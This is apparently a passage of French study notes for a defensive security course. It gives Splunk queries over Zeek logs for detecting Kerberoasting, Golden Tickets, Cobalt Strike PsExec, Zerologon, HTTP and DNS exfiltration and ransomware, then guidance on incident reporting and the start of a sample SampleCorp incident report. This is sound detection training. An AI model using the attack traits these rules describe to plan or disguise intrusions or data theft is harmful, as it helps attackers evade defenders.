   * `table _time, id.orig_h, id.resp_h, request_type, cipher, forwardable, renewable, client, service` : Affiche les informations essentielles pour l’analyse :

     * Date et heure de l’événement.
     * IP source (client) et IP destination (souvent un contrôleur de domaine).
     * Type de requête, chiffrement utilisé.
     * Compte client et service cible.

---

### 🕵️ **Interprétation**

* **Plusieurs requêtes TGS en RC4** : Une fréquence élevée de requêtes TGS avec RC4 par un même utilisateur ou hôte est **hautement suspecte**.
* **Comptes à privilèges ou services sensibles** : Si le champ `service` cible un compte critique (SQL, Exchange, etc.), cela peut indiquer une tentative de Kerberoasting.
* **Activité centralisée sur un poste utilisateur** : Des requêtes massives de TGS depuis un poste utilisateur (plutôt qu’un service ou serveur) sont anormales.

---

### 📌 **À investiguer**

* **Client (`id.orig_h`)** : S’agit-il d’une machine légitime ?
* **Compte (`client`)** : Est-ce un compte utilisateur normal ou un compte de service détourné ?
* **Service ciblé (`service`)** : Est-ce un compte ayant des privilèges élevés ou un rôle critique ?

---

```

## **Detecting Golden Tickets**

```jsx

---

### ✅ Strengths

* **Precision Targeting**: Focusing on `request_type=="TGS"` and `unique_request_types==1` accurately narrows in on possible forged activity.
* **Use of Zeek's `bro:kerberos:json`**: Shows you're leveraging network-layer Kerberos visibility, which is less prone to tampering than Windows logs alone.
* **Binning by Time**: Grouping by 1-minute intervals helps detect burst or pattern-based activity, which is key in attacker behavior.

---

### 🔍 Suggested Enhancements

#### 1. **Improve `request_types=="TGS"` Handling**

`values(request_type)` can return a multivalue field (array-like), so direct equality may be unreliable. Use `mvcount()` and `mvindex()` to improve robustness:

```spl
| where unique_request_types==1 AND mvcount(request_types)==1 AND mvindex(request_types,0)=="TGS"
```

This ensures `request_types` truly only contains `"TGS"`.

---

#### 2. **Add Host Context**

If Zeek logs contain `host` or `principal` fields, include them for deeper triage:

```spl
| stats values(client), values(principal), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
```

---

#### 3. **Add Baseline for Alert Tuning**

To avoid false positives, consider correlating results with a list of known service accounts (e.g., via `lookup service_accounts.csv`) to suppress legitimate batch activity.

---

#### 4. **Optional: Include Count for Volume**

Adding request count per interval can reveal abnormal ticket request volume:

```spl
| stats count as total_requests, values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
```

Then filter with something like:

```spl
| where total_requests > 10 AND unique_request_types==1 AND mvcount(request_types)==1 AND mvindex(request_types,0)=="TGS"
```

---

### ✅ Final Enhanced Query Example

```spl
index="golden_ticket_attack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin _time span=1m
| stats count as total_requests, values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
| where total_requests > 10 AND unique_request_types==1 AND mvcount(request_types)==1 AND mvindex(request_types,0)=="TGS"
```

This version is more robust and better tuned for production alerts.

---

```

## **Detecting Cobalt Strike's PSExec**

```jsx

---

## Requête Splunk pour la détection de l’outil PSExec de Cobalt Strike

La requête suivante permet de repérer les comportements caractéristiques de l’utilisation de l’outil `psexec` de **Cobalt Strike**. Celui-ci s’appuie sur le protocole **SMB** pour déposer et exécuter des fichiers (typiquement des exécutables) sur une machine cible, en accédant à des partages administratifs comme `C$` ou `ADMIN$`.

### Requête Splunk

```spl
index="cobalt_strike_psexec"
sourcetype="bro:smb_files:json"
action="SMB::FILE_OPEN" 
name IN ("*.exe", "*.dll", "*.bat")
path IN ("*\\c$", "*\\ADMIN$")
size > 0
```

---

### Détail de la requête

1. **Sélection de la source de données**

   * `index="cobalt_strike_psexec"` : Cible l’index contenant les événements liés aux activités de `psexec`.
   * `sourcetype="bro:smb_files:json"` : Filtre les événements SMB enregistrés par Zeek/Bro, au format JSON, relatifs aux opérations sur fichiers via SMB.

2. **Filtrage des actions d’ouverture de fichier**

   * `action="SMB::FILE_OPEN"` : Ne conserve que les événements où un fichier a été ouvert via SMB — une action typique lors du déploiement d’un binaire avec `psexec`.

3. **Types de fichiers suspects**

   * `name IN ("*.exe", "*.dll", "*.bat")` : Cible les fichiers exécutables, DLL et scripts batch — types couramment utilisés pour déposer des charges malveillantes.

4. **Accès aux partages administratifs**

   * `path IN ("*\\c$", "*\\ADMIN$")` : Se concentre sur les chemins administratifs Windows, comme `C$` et `ADMIN$`, que `psexec` utilise souvent pour transférer des fichiers.

5. **Fichiers non vides**

   * `size > 0` : Exclut les fichiers vides pour ne garder que ceux susceptibles de contenir une véritable charge utile.

---

## Stratégie de détection et interprétation

Cette requête permet d’identifier une séquence d’actions typique de l’utilisation de `psexec` par Cobalt Strike :

* **Déploiement de payload à distance** : L’ouverture d’un fichier `.exe`, `.dll` ou `.bat` sur un partage comme `C$` ou `ADMIN$`, via SMB, suggère un déploiement automatisé à l’aide d’un outil d’administration distante.

* **Filtrage efficace du trafic légitime** : En ciblant les fichiers exécutables non vides sur des partages administratifs, on limite les faux positifs dus aux opérations légitimes ou aux fichiers inoffensifs.

---

```

## **Detecting Zerologon**

```jsx
### **Splunk Query for Detecting Zerologon Attack**

```spl
index="zerologon" endpoint="netlogon" sourcetype="bro:dce_rpc:json"
| bin _time span=1m
| where operation == "NetrServerReqChallenge" OR operation == "NetrServerAuthenticate3" OR operation == "NetrServerPasswordSet2"
| stats count values(operation) as operation_values dc(operation) as unique_operations by _time, id.orig_h, id.resp_h
| where unique_operations >= 2 AND count>100
```

### **Query Breakdown**:

1. **Data Source**:

   * `index="zerologon"`: Filters for Zerologon-related events.
   * `endpoint="netlogon"`: Focuses on Netlogon traffic, exploited in Zerologon.
   * `sourcetype="bro:dce_rpc:json"`: Captures DCE-RPC logs from Zeek.

2. **Time Binning**:

   * `| bin _time span=1m`: Groups events in one-minute intervals to detect rapid patterns.

3. **Key Operations Filtering**:

   * Filters for Zerologon-related operations: `NetrServerReqChallenge`, `NetrServerAuthenticate3`, and `NetrServerPasswordSet2`.

4. **Statistical Analysis**:

   * `| stats count values(operation) as operation_values dc(operation) as unique_operations by _time, id.orig_h, id.resp_h`: Aggregates by time and IPs, counting occurrences and distinct operations.

5. **Anomalous Pattern Detection**:

   * `| where unique_operations >= 2 AND count>100`: Flags cases with multiple operations and high counts, indicating suspicious activity typical of a Zerologon attack.

```

## **Detecting Exfiltration (HTTP)**

```jsx
### Requête Splunk pour détecter une exfiltration de données via HTTP

```spl
index="cobaltstrike_exfiltration_http" sourcetype="bro:http:json" method=POST
| stats sum(request_body_len) as TotalBytes by src, dest, dest_port
| eval TotalBytes = TotalBytes/1024/1024
```

### Explication de la requête

1. **Sélection de la source de données** :

   * `index="cobaltstrike_exfiltration_http"` : cible les logs présents dans l’index dédié à la détection d’exfiltration HTTP potentielle liée à Cobalt Strike.
   * `sourcetype="bro:http:json"` : sélectionne uniquement les logs HTTP générés par Zeek (anciennement Bro) au format JSON.
   * `method=POST` : filtre pour ne garder que les requêtes HTTP de type POST, car ce type de méthode est fréquemment utilisé pour exfiltrer des données dans le corps des requêtes.

2. **Agrégation du volume de données transférées** :

   * `| stats sum(request_body_len) as TotalBytes by src, dest, dest_port` : calcule la somme de la taille des corps des requêtes POST (`request_body_len`) envoyés par chaque IP source (`src`) vers chaque IP de destination (`dest`) et port de destination (`dest_port`).

     * Cela permet de repérer des transferts anormalement volumineux de données vers certaines destinations, ce qui peut révéler une exfiltration.

3. **Conversion de l’unité de mesure** :

   * `| eval TotalBytes = TotalBytes/1024/1024` : convertit la taille totale des données transférées depuis les octets vers les mégaoctets (Mo) pour une lecture plus intuitive.

```

## **Detecting Exfiltration (DNS)**

```jsx
### Requête Splunk pour détecter une exfiltration de données via DNS

```spl
index=dns_exf sourcetype="bro:dns:json"
| eval len_query=len(query)
| search len_query>=40 AND query!="*.ip6.arpa*" AND query!="*amazonaws.com*" AND query!="*._googlecast.*" AND query!="_ldap.*"
| bin _time span=24h
| stats count(query) as req_by_day by _time, id.orig_h, id.resp_h
| where req_by_day>60
| table _time, id.orig_h, id.resp_h, req_by_day
```

### Explication de la requête

1. **Sélection des données pertinentes** :

   * `index=dns_exf sourcetype="bro:dns:json"` : filtre les logs pour ne garder que ceux relatifs au DNS (au format JSON de Bro/Zeek DNS) dans l’index `dns_exf`, utilisé ici pour surveiller une éventuelle exfiltration de données par DNS.

2. **Calcul de la longueur des requêtes DNS** :

   * `| eval len_query=len(query)` : calcule la longueur de chaque requête DNS et stocke cette valeur dans un nouveau champ `len_query`. Les requêtes longues peuvent contenir des données encodées ou chiffrées.

3. **Filtrage sur la longueur des requêtes et exclusion de domaines légitimes fréquents** :

   * `| search len_query>=40 AND query!="*.ip6.arpa*" AND query!="*amazonaws.com*" AND query!="*._googlecast.*" AND query!="_ldap.*"` :

     * conserve uniquement les requêtes DNS dont la longueur est supérieure ou égale à 40 caractères,
     * exclut les domaines connus et bénins, comme les requêtes de résolution IPv6 (`ip6.arpa`), les services cloud (`amazonaws.com`), les appareils Chromecast (`_googlecast`) et les requêtes LDAP.

4. **Regroupement des événements par tranche de 24 heures** :

   * `| bin _time span=24h` : regroupe les événements par jour pour faciliter l’analyse temporelle.

5. **Comptage des requêtes par jour et par hôte** :

   * `| stats count(query) as req_by_day by _time, id.orig_h, id.resp_h` : compte le nombre total de requêtes DNS par jour (`req_by_day`), en les regroupant par adresse IP source (`id.orig_h`) et destination (`id.resp_h`).

6. **Identification d’activités suspectes** :

   * `| where req_by_day>60` : ne garde que les hôtes ayant généré plus de 60 requêtes DNS par jour — un comportement potentiellement indicatif d’exfiltration.

7. **Affichage des résultats** :

   * `| table _time, id.orig_h, id.resp_h, req_by_day` : affiche les résultats dans un tableau avec la date, l’IP source, l’IP de destination et le nombre de requêtes par jour, pour une analyse simplifiée.

```

## **Detecting Ransomware**

```jsx

---

## **Détection des ransomwares avec Splunk**

### **1. Détection des opérations excessives d'ouverture et de renommage de fichiers**

Ce type de comportement est souvent observé lors d'attaques par ransomware, où de nombreux fichiers sont ouverts et renommés dans de courtes périodes.

#### **Requête Splunk**

```spl
index="ransomware_open_rename_sodinokibi" sourcetype="bro:smb_files:json" 
| where action IN ("SMB::FILE_OPEN", "SMB::FILE_RENAME")
| bin _time span=5m
| stats count by _time, source, action
| where count>30 
| stats sum(count) as count values(action) dc(action) as uniq_actions by _time, source
| where uniq_actions==2 AND count>100
```

#### **Explication de la requête**

* **Filtrage des événements** : La recherche se limite aux actions `FILE_OPEN` et `FILE_RENAME` dans l'index spécifié.
* **Groupement par intervalles de 5 minutes** : Les événements sont regroupés par périodes de 5 minutes pour détecter des pics d'activité.
* **Comptage des événements** : Les actions sont comptées par `source` dans chaque période de 5 minutes, avec un seuil de 30 actions.
* **Agrégation des résultats** : Vérifie si les actions `FILE_OPEN` et `FILE_RENAME` sont présentes dans les 100 premières occurrences, ce qui peut indiquer un comportement de ransomware.

---

### **2. Détection du renommage excessif de fichiers avec de nouvelles extensions**

Les ransomwares ont souvent pour habitude de renommer les fichiers en leur ajoutant des extensions uniques pour indiquer qu'ils ont été chiffrés.

#### **Requête Splunk**

```spl
index="ransomware_new_file_extension_ctbl_ocker" sourcetype="bro:smb_files:json" action="SMB::FILE_RENAME" 
| bin _time span=5m
| rex field="name" "\.(?<new_file_name_extension>[^\.]*$)"
| rex field="prev_name" "\.(?<old_file_name_extension>[^\.]*$)"
| stats count by _time, id.orig_h, id.resp_p, name, source, old_file_name_extension, new_file_name_extension
| where new_file_name_extension!=old_file_name_extension
| stats count by _time, id.orig_h, id.resp_p, source, new_file_name_extension
| where count>20
| sort -count
```

#### **Explication de la requête**

* **Filtrage par action et temps** : Limite les résultats aux événements de renommage de fichiers dans des fenêtres de 5 minutes.
* **Extraction des extensions** : Utilise des expressions régulières pour extraire les extensions des fichiers avant et après le renommage.
* **Filtrage des changements d'extension** : Conserve uniquement les événements où l'extension du fichier a changé.
* **Agrégation des résultats** : Compte les occurrences des nouveaux noms de fichiers par `source` et `new_file_name_extension`.
* **Détection de ransomware** : Identifie les cas où plus de 20 fichiers ont été renommés avec la même nouvelle extension dans un intervalle de 5 minutes.

---

### **Ressources supplémentaires pour la détection des ransomwares**

Ces ressources peuvent fournir des informations utiles pour détecter les ransomwares en se basant sur les extensions de fichiers et les motifs de noms connus :

* [Ransomware Extensions Spreadsheet](https://docs.google.com/spreadsheets/d/e/2PACX-1vRCVzG9JCzak3hNqqrVCTQQIzH0ty77BWiLEbDu-q9oxkhAamqnlYgtQ4gF85pF6j6g3GmQxivuvO1U/pubhtml)
* [Corelight’s Detect-Ransomware-Filenames Repository](https://github.com/corelight/detect-ransomware-filenames)
* [Experiant’s FSRM Ransomware Extensions](https://fsrm.experiant.ca/)

---

```

## **Security Incident Reporting**

## **Incident Reporting Process**

```jsx
### Aperçu

Le rapport d'incident de sécurité est essentiel dans le paysage technologique actuel pour protéger les actifs organisationnels et répondre efficacement aux menaces. Ce processus permet de documenter les incidents, d'apprendre des événements passés et d'améliorer les capacités de réponse futures.

### Importance

Le rapport d'incident :

* **Relie la détection à l'atténuation**.
* **Crée un référentiel des leçons tirées**.
* **Informe l'évaluation des risques, la conformité et la sensibilisation des parties prenantes**.

### Identification et Catégorisation des Incidents

#### Sources principales :

* **Outils de sécurité** : IDS, IPS, EDR, XDR, SIEM, antivirus, données NetFlow.
* **Observation humaine** : Rapports d'employés concernant des activités inhabituelles.
* **Notifications de tiers** : Alertes provenant de partenaires, fournisseurs ou clients.

#### Types d'incidents :

* **Malware** : Virus, ransomware.
* **Phishing** : Tentatives de vol de données sensibles.
* **DDoS** : Attaques par saturation pour perturber les services.
* **Accès non autorisé** : Entrée non autorisée dans les systèmes ou données.
* **Fuite de données** : Exposition accidentelle de données.
* **Breach physique** : Accès physique non autorisé.

#### Niveaux de sévérité :

* **Critique (P1)** : Risque immédiat pour les fonctions principales, nécessite une action urgente.
* **Élevé (P2)** : Risque important, nécessite une attention rapide.
* **Moyenne (P3)** : Risque modéré, une réponse en temps utile est conseillée.
* **Faible (P4)** : Problèmes mineurs, peuvent être gérés dans les opérations quotidiennes.

### Processus de Rapport d'Incident

1. **Détection et reconnaissance** : Identification initiale, souvent par des alertes automatisées ou des observations humaines.
2. **Analyse préliminaire** : Évaluer la portée et l'impact potentiel ; catégoriser l'incident.
3. **Enregistrement de l'incident** : Documenter tous les détails. Utiliser des outils comme JIRA, TheHive ou des alternatives plus simples.
4. **Notification** :

   * **Interne** : Informer les équipes IT, juridiques, PR et exécutives.
   * **Externe** : Si nécessaire, notifier les clients, partenaires, autorités réglementaires ou le public.
5. **Investigation et rapport détaillé** : Réaliser une analyse approfondie de l'incident.
6. **Création du rapport final** : Fournir un rapport complet aux parties prenantes, détaillant l'incident, ses causes et les mesures correctives.
7. **Boucle de rétroaction** : Analyse post-incident pour améliorer la préparation à la réponse.

```

## **Elements of a Proper Incident Report**

```jsx
### Résumé Exécutif

Le résumé exécutif sert de point d'entrée accessible à un large public, y compris aux parties prenantes non techniques. Cette section fournit une vue d'ensemble concise, les principaux résultats, les actions immédiates prises et l'impact sur les parties prenantes. De nombreuses parties prenantes ne liront que cette section, il est donc essentiel d'assurer une grande clarté.

#### Section  |  Description

* **ID de l'incident** : Identifiant unique de l'incident.
* **Vue d'ensemble de l'incident** : Résumé des événements de l'incident (y compris la détection initiale) et du type d'attaque (par exemple, ransomware, violation de données). Inclure l'heure estimée, la durée, les systèmes/données affectés et l'état (en cours, résolu ou escaladé).
* **Principaux résultats** : Résumé de la cause principale et des vulnérabilités spécifiques exploitées. Mentionner les données compromises ou exfiltrées.
* **Actions immédiates prises** : Détail des actions prises, comme l'isolement des systèmes, l'identification de la cause principale et l'engagement des services tiers.
* **Impact sur les parties prenantes** : Évaluer l'impact sur les clients, les employés, les informations propriétaires et les conséquences financières potentielles.

### Analyse Technique

Analyse approfondie des événements techniques pendant l'incident. Cette section devrait couvrir :

#### Systèmes et Données Affectés

* Lister tous les systèmes compromis ou potentiellement accessibles. Si des données ont été exfiltrées, spécifier la quantité.

#### Sources de Preuves et Analyse

* Inclure toutes les preuves analysées et la méthodologie (par exemple, les journaux d'accès Web). Mettre l'accent sur l'intégrité des preuves avec des hachages lorsque nécessaire.

#### Indicateurs de Compromission (IoC)

* Fournir les IoC (par exemple, processus inhabituels, trafic sortant) pour la recherche de menaces ou l'attribution à des acteurs de menace spécifiques.

#### Analyse de la Cause Racine

* Explication détaillée des vulnérabilités exploitées, des causes profondes et des points de défaillance.

#### Chronologie Technique

Documenter les événements clés, y compris :

* **Reconnaissance**
* **Compromission initiale**
* **Communications C2**
* **Énumération, mouvement latéral**
* **Accès et exfiltration de données**
* **Déploiement de malwares (Injection de processus, persistance)**
* **Temps de confinement, d'éradication et de récupération**

#### Nature de l'attaque

* Explication du type d'attaque, des TTP (tactiques, techniques et procédures) utilisées par l'attaquant.

### Analyse de l'Impact

Évaluer les effets négatifs sur les données, les opérations et la réputation. Cela inclut la quantification et la qualification des dommages, les implications pour l'entreprise (par exemple, pertes financières), les pénalités réglementaires et les impacts sur la réputation.

### Analyse de la Réponse et de la Récupération

#### Actions Immédiates de Réponse

**Révocation d'accès**

* **Comptes/Systèmes compromis identifiés** : Détail des outils et méthodes utilisés pour identifier les entités compromises.
* **Cadre temporel** : Horodatage précis de la détection et de la révocation.
* **Méthode de révocation** : Explication des méthodes de révocation (par exemple, désactivation des comptes, modification des règles du pare-feu).
* **Impact** : Prévention de toute autre compromission ou exfiltration.

**Stratégie de Confinement**

* **Confinement à court terme** : Isolement des systèmes affectés du réseau.
* **Confinement à long terme** : Mesures stratégiques comme la segmentation ou la mise en œuvre de la sécurité zero-trust.
* **Efficacité** : Évaluation des mesures de confinement.

#### Mesures d'Éradication

**Suppression de Malware**

* **Identification** : Procédures utilisées pour détecter le malware, y compris les outils EDR ou l'analyse forensic.
* **Techniques de suppression** : Outils spécifiques ou méthodes manuelles utilisées.
* **Vérification** : Étapes pour assurer la suppression complète, comme la vérification des sommes de contrôle.

**Patching du Système**

* **Identification des vulnérabilités** : Méthodes de découverte des vulnérabilités (par exemple, CVEs).
* **Gestion des patches** : Étapes pour tester, déployer et vérifier les patches.
* **Procédures de retour en arrière** : Procédures en cas d'instabilité après déploiement.

#### Étapes de Récupération

**Restauration des données**

* **Validation des sauvegardes** : Procédures pour confirmer l'intégrité des sauvegardes.
* **Processus de restauration** : Étapes détaillées pour la récupération des données.
* **Vérifications de l'intégrité des données** : Vérification de l'exactitude des données restaurées.

**Validation du système**

* **Mesures de sécurité** : Assurer la sécurité du système par la reconfiguration ou la mise à jour des IDS.
* **Contrôles opérationnels** : Vérification que les systèmes fonctionnent comme prévu.

### Actions Post-Incident

#### Surveillance

* **Plans de surveillance améliorés** : Plans détaillés pour la surveillance future afin de détecter des vulnérabilités similaires.
* **Outils et technologies** : Outils spécifiques intégrés dans la stratégie de surveillance.

#### Leçons Tirées

* **Analyse des lacunes** : Évaluation des mesures de sécurité échouées.
* **Recommandations pour l'amélioration** : Étapes concrètes pour renforcer les défenses.
* **Stratégie future** : Changements à long terme dans la politique, l'architecture ou la formation.

### Diagrammes

Utiliser des visuels pour simplifier les complexités de l'incident :

* **Diagramme de flux de l'incident** : Progression de l'attaque du point d'entrée à la propagation du réseau.
* **Carte des systèmes affectés** : Topologie réseau mettant en évidence les nœuds compromis.
* **Diagramme du vecteur d'attaque** : Diagramme du mouvement de l'attaquant et de son chemin d'exploitation.

### Annexes

Fournit un contexte supplémentaire, des preuves ou des détails techniques. Cette section sert de base pour la vérification et ajoute de la profondeur au récit principal du rapport.

Les contenus peuvent inclure :

* **Fichiers journaux**
* **Diagrammes du réseau (avant et après l'incident)**
* **Preuves forensic (images disque, vidages de mémoire)**
* **Extraits de code**
* **Liste de contrôle de réponse à l'incident**
* **Archives de communication**
* **Documents de conformité (NDA, formulaires réglementaires)**
* **Glossaire et acronymes**

### Meilleures Pratiques

* **Analyse des causes profondes** : Identifier la cause fondamentale pour éviter une répétition.
* **Partage communautaire** : Partager des informations non sensibles avec la communauté de la sécurité.
* **Mises à jour régulières** : Informer les parties prenantes tout au long de la réponse à l'incident.
* **Révision externe** : Faire appel à des experts tiers pour valider les conclusions.

### Conclusion

Un rapport d'incident est essentiel après un événement de sécurité, offrant une analyse approfondie de ce qui a échoué, des réponses efficaces et des stratégies pour prévenir des événements similaires à l'avenir.

```

## **Communications**

```jsx
### La Communication Efficace en Cas de Crise de Sécurité

La communication efficace est indispensable lors d'une crise, en particulier lors d'un incident de sécurité. Une communication transparente, coordonnée et bien structurée soutient la construction de la confiance, la conformité réglementaire et l'efficacité des efforts de réponse.

### L'Importance de la Communication Efficace

La valeur d'une communication claire lors d'un incident peut être catégorisée en plusieurs domaines clés :

#### Confiance des Parties Prenantes

La communication transparente favorise la confiance des parties prenantes. En communiquant rapidement et clairement, une organisation démontre sa responsabilité, sa transparence et son contrôle sur l'incident.

#### Coordination et Efficacité

Un incident de cybersécurité affecte plus que l’équipe technique ; il a des implications plus larges au sein de l'organisation. Une communication coordonnée assure l'alignement entre toutes les parties prenantes, améliorant ainsi la rapidité et l'efficacité de la réponse.

#### Conformité Réglementaire

Vérifiez les exigences de conformité spécifiques à votre organisation, qui devraient être documentées dans le Plan de Réponse aux Incidents (PRI). Les directives réglementaires dictent souvent comment, quand et ce qui doit être communiqué pour respecter les exigences légales.

### Communication Interne

Les communications internes sont cruciales pour maintenir un message cohérent et constant au sein de l'organisation. Cela est particulièrement important pour éviter les fuites et la désinformation. Les éléments clés des communications internes comprennent :

* **Notification Immédiate** : Informer rapidement toutes les parties prenantes pertinentes dès l'identification de l'incident.
* **Mises à Jour Régulières** : Partager des mises à jour régulières avec les équipes concernées, couvrant l'état de l'incident, les impacts potentiels et les actions en cours.
* **Boucle de Rétroaction** : Établir un canal de rétroaction permettant aux équipes de partager leurs remarques, préoccupations et suggestions.

### Communication Externe

Les communications externes doivent être soigneusement planifiées, car elles concernent souvent divers tiers, allant des clients aux régulateurs. Les considérations importantes incluent :

* **Parties Affected** : Communiquer directement avec les individus ou entités affectés, comme les clients, partenaires ou fournisseurs.
* **Déclaration Publique** : En cas d'incidents de grande envergure, envisager de publier une déclaration publique claire et sans jargon technique pour garantir l'accessibilité.
* **Organismes de Régulation** : Notifier les entités réglementaires, telles que la CNIL (Commission Nationale de l'Informatique et des Libertés), si requis par la juridiction ou la loi, dans les délais spécifiés.

### Naviguer dans les Canaux de Communication lors d’Incidents de Cybersécurité

Une communication efficace lors d’un incident de cybersécurité nécessite des canaux sécurisés et conformes. Voici un aperçu des considérations techniques et réglementaires pour ces canaux.

#### Dimensions de Sécurité des Canaux de Communication

* **Chiffrement** : Assurez-vous que toutes les communications sont sécurisées avec un chiffrement de bout en bout, en particulier lors de discussions de détails sensibles.
* **Authentification et Autorisation** : Protégez l'accès aux canaux de communication avec une authentification multi-facteurs stricte (MFA) pour vérifier les identités.
* **Intégrité des Données** : Utilisez des hachages cryptographiques pour garantir que les messages restent inchangés lors de leur transmission.
* **Communications Éphémères** : Pour les discussions très confidentielles, envisagez l'utilisation de plateformes qui suppriment les messages après leur lecture afin de réduire les risques de fuites futures.
* **Communications Isolées (Air-Gapped)** : Si les systèmes de communication principaux sont compromis, utilisez des systèmes isolés qui sont séparés des autres réseaux pour maintenir la sécurité.

#### Dimensions Réglementaires des Canaux de Communication

* **Lois sur la Confidentialité des Données** : Adhérez aux régulations sur la confidentialité des données, telles que le RGPD (Règlement Général sur la Protection des Données), surtout lorsqu'il s'agit de données personnelles, pour assurer la conformité.
* **Mandats de Notification des Violations** : Suivez les délais et les lignes directrices spécifiques à chaque juridiction concernant la notification des parties prenantes en cas de violation des données.
* **Conservation des Documents** : Trouvez un équilibre entre la messagerie éphémère et les exigences de conservation des documents, car certaines régulations imposent de conserver les communications liées à l'incident.
* **Communications Transfrontalières** : Soyez conscient des lois sur la souveraineté des données qui peuvent affecter les protocoles de communication et le stockage des données si l'incident concerne plusieurs juridictions.
* **Chaîne de Custodie** : Maintenez une chaîne de custodie ininterrompue pour toutes les communications si des procédures légales sont anticipées, afin de garantir que les preuves restent recevables en justice.

### Conclusion

La communication efficace est un composant critique de la réponse aux incidents, reliant la coordination interne et les exigences réglementaires. En mettant en œuvre des stratégies de communication sécurisées, bien planifiées et conformes, les organisations peuvent renforcer leur résilience et répondre plus efficacement aux incidents de sécurité.

```

## **Real-world Incident Report**

<aside>
💡

**Résumé Exécutif**

- **ID de l'incident :** INC2019-0422-022
- **Gravité de l'incident :** Élevée (P2)
- **Statut de l’incident :** Résolu

**Aperçu de l'incident :**

Dans la nuit du 22 avril 2019 à 01:05:00, le Centre des Opérations de Sécurité (SOC) de SampleCorp a détecté une activité non autorisée sur le réseau interne. Celle-ci s’est manifestée par le lancement de processus anormaux et des commandes PowerShell suspectes. Profitant d’un manque de contrôles d’accès réseau robustes et de deux vulnérabilités de sécurité, un acteur malveillant est parvenu à prendre le contrôle des nœuds suivants de l’infrastructure de SampleCorp :

- **WKST01.samplecorp.com** : système utilisé pour le développement logiciel.
- **HR01.samplecorp.com** : système dédié au traitement des données des employés et partenaires.

Le SOC de SampleCorp, en collaboration avec les équipes de Réponse aux Incidents et d’Investigation Numérique (DFIR), a pu contenir la menace, supprimer les logiciels malveillants et corriger les failles de sécurité. Les systèmes compromis ont été restaurés dans leur état initial.

**Constats clés :**

L’intrus a pu obtenir une adresse IP interne en connectant simplement son ordinateur à un port Ethernet dans un bureau de SampleCorp, en raison de contrôles d’accès réseau insuffisants. L’enquête a révélé que l’entité malveillante a initialement compromis **WKST01.samplecorp.com** via une version vulnérable d’Acrobat Reader, puis a exploité une vulnérabilité de type "buffer overflow" dans une application propriétaire développée par SampleCorp pour étendre son accès. Aucune fuite massive de données n’a été détectée, probablement grâce à l’intervention rapide du SOC et des équipes DFIR. Toutefois, l’accès non autorisé à **WKST01** et **HR01** implique que les données internes et client doivent être considérées comme potentiellement compromises.

**Actions immédiates :**

Les équipes SOC et DFIR internes ont géré l’incident sans faire appel à des prestataires externes. Les systèmes compromis ont été isolés par segmentation VLAN. Pour mener une enquête approfondie, un ensemble de données a été collecté, incluant des captures du trafic réseau. Tous les systèmes affectés ont été raccordés à une solution de sécurité hôte, et les journaux d’événements ont été collectés automatiquement via la solution Elastic SIEM existante.

**Impact sur les parties prenantes :**

- **Clients :**
    
    Bien qu’aucune exfiltration massive n’ait été détectée, l’accès non autorisé aux systèmes susmentionnés soulève des inquiétudes quant à l’intégrité et à la confidentialité des données clients. Par mesure de précaution, certains services ont été temporairement mis hors ligne et des clés API ont été révoquées, entraînant de courtes périodes d’indisponibilité. L’impact financier de cette interruption est en cours d’évaluation, avec un risque potentiel de perte de revenus et de confiance client.
    
- **Employés :**
    
    Le système **HR01.samplecorp.com**, contenant des données sensibles sur les employés, a été compromis. Bien qu’aucune preuve d’une extraction ciblée des données n’ait été trouvée, le risque demeure. Les employés pourraient être exposés à des tentatives de vol d’identité ou de phishing.
    
- **Partenaires commerciaux :**
    
    L’accès à **WKST01.samplecorp.com**, un environnement de développement, laisse supposer que du code propriétaire ou des technologies confidentielles pourraient avoir été exposés. Cela peut impacter la confiance des partenaires commerciaux dans l’exclusivité des solutions technologiques de SampleCorp.
    
- **Organismes de régulation :**
    
    Cette faille de sécurité peut entraîner des conséquences réglementaires. Selon les juridictions concernées et la nature des données compromises, des amendes ou sanctions pourraient être infligées à SampleCorp pour manquement à la protection des données sensibles.
    
- **Équipes internes :**
    
    Bien que les équipes SOC et DFIR aient efficacement contenu l’incident, celui-ci nécessitera probablement une révision voire une refonte des mesures de sécurité existantes. Cela pourrait entraîner une réallocation des ressources et des ajustements budgétaires, affectant d’autres projets ou départements.
    
- **Actionnaires :**
    
    À court terme, l’incident pourrait affecter négativement le cours de l’action en raison d’une possible perte de confiance des clients et de potentielles sanctions. À long terme, les impacts dépendront de l’efficacité des mesures correctives mises en place et de la capacité de l’entreprise à restaurer la confiance des parties prenantes.
    

**Analyse Technique**

**Systèmes et Données Affectés**

En raison d’un manque de contrôles d’accès réseau efficaces, un individu non autorisé a pu obtenir une adresse IP interne simplement en connectant son ordinateur à un port Ethernet dans les locaux de SampleCorp.

L’entité malveillante est parvenue à prendre le contrôle des systèmes suivants au sein de l’infrastructure de SampleCorp :

- **WKST01.samplecorp.com** : Environnement de développement contenant du code source propriétaire destiné à de futures versions logicielles, ainsi que des clés API pour des services tiers. L’analyse des accès montre que l’intrus a parcouru plusieurs répertoires, ce qui soulève des inquiétudes quant à un éventuel vol de propriété intellectuelle et à une utilisation abusive des clés API.
- **HR01.samplecorp.com** : Système de gestion des ressources humaines contenant des données sensibles relatives aux employés et partenaires : informations personnelles, données de paie et évaluations de performance. Les journaux d’activité confirment un accès non autorisé à ce système. Le point le plus préoccupant est l’accès à une base de données non chiffrée contenant les numéros de sécurité sociale et les coordonnées bancaires des employés. Bien qu’aucune preuve d’exfiltration n’ait été détectée, le risque potentiel de vol d’identité et de fraude financière est jugé élevé.

**Sources et Analyse des Preuves**

**WKST01.samplecorp.com**

Dans la nuit du 22 avril 2019, à 01:05:00 précises, le Centre des Opérations de Sécurité (SOC) de SampleCorp a détecté une activité anormale sur le réseau interne. Cette alerte a été déclenchée par l’observation de relations inhabituelles entre processus parent-enfant et l’exécution de commandes PowerShell suspectes, comme illustré dans une capture d’écran interne.

L’analyse des journaux révèle que PowerShell a été invoqué via **cmd.exe** pour exécuter le contenu d’un script hébergé à distance. L’adresse IP du serveur distant était **192.168.220.66**, une adresse interne, ce qui indique que l’entité malveillante avait déjà pénétré le réseau interne avant l’exécution du script.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%206.png)

Les premiers signes d'exécution de commandes malveillantes indiquent que **WKST01.samplecorp.com** a probablement été compromis suite à l'ouverture d'une pièce jointe suspecte dans un e-mail, nommée **cv.pdf**, et ce pour les raisons suivantes :
